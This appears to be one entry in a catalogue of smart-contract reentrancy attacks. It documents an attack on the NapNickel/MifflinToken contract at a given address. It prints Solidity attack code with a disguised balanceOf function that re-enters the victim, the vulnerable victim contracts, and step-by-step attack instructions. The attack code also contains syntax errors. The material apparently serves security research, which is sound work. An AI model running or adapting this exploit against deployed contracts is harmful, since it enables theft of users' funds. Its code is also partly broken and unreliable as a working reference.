#########
Attack 10
#########

**Contract Name**

NapNickel

**Contract Address**

0x1ff6f142ebdce220d8dd85eb31dcb92a47690846

**Transaction Count**

1

**Invovled Ethers**

0.1 Ethers

**Length of the Call Chain**

2 external function, 2 internal funciton

**Victim Function**

``CashOut``

**Attack Mechanisim**

Attack code:
::

    contract Attack is MifflinToken {
        address victim;
        address market;
        constructor() payable {}

        function setVictim(address _vic, address _market) {
            victim = _vic
            market = _market
        }

        function prepareAttack() {
            market.call(bytes4(keccak256("setToken(uint8, address)")), 1, this);
        }

        function balanceOf(MifflinToken token) public {   // Disguised attack function
            victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
        }

        function() payable{
            p.CashOut(1 eth);
        }

        function getvalue() returns (uint) {
            return this.balance;
        }
    }

Attacked code:
::

    contract MifflinToken is Owned, TokenERC20 {
        ...
        function contribution(uint256 amount)internal returns(int highlow){
            owner.transfer(msg.value);
            totalContribution += msg.value;

            if (amount > highestContribution) {
                uint256 oneper = buyPrice * 99 / 100; // lower by 1%*
                uint256 fullper = buyPrice *  highestContribution / amount; // lower by how much you beat the prior contribution
                if(fullper > oneper) buyPrice = fullper;
                else buyPrice = oneper;
                highestContribution = amount;
                // give reward
                MifflinMarket(exchange).highContributionAward(msg.sender);
                return 1;
            } else if(amount < lowestContribution){
                MifflinMarket(exchange).lowContributionAward(msg.sender);
                lowestContribution = amount;
                return -1;
            } else return 0;
        }

        ...
    }

    contract MifflinMarket is Owned {
        ...
        modifier onlyOwnerOrigin{
            require(tx.origin == owner);
            _;
        }

        function setToken(uint8 tid,address addy) public onlyOwnerOrigin { // Only add tokens that were created by exchange owner
            tokenIds[tid] = addy;
        }

        function getRewardToken() public view returns(MifflinToken){
            return getTokenById(rewardTokenId);
        }

        function getTokenById(uint8 id) public view returns(MifflinToken){
            require(tokenIds[id] > 0);
            return MifflinToken(tokenIds[id]);
        }

        function highContributionAward(address to) public onlyTokens {
            MifflinToken reward = getRewardToken();
            //dont throw an error if there are no more tokens
            if(reward.balanceOf(reward) > 0){
                reward.give(to, 1);
            }
        }
        ...
    }
    ...

In this case, the key condition defenses reentrancy attack is ``reward.balanceOf(reward) > 0`` in function ``highContributionAward``. However, ``reward`` can be easily tainted. It inherits value from ``tokenIds[id]``, which can also be easily taited by any access.

**Attack.** The attacker call ``setVictim`` function to specify the address to attack. Then attacker call ``prepareAttack``function to taint variable. Finally attacker call ``balanceOf`` to start attack.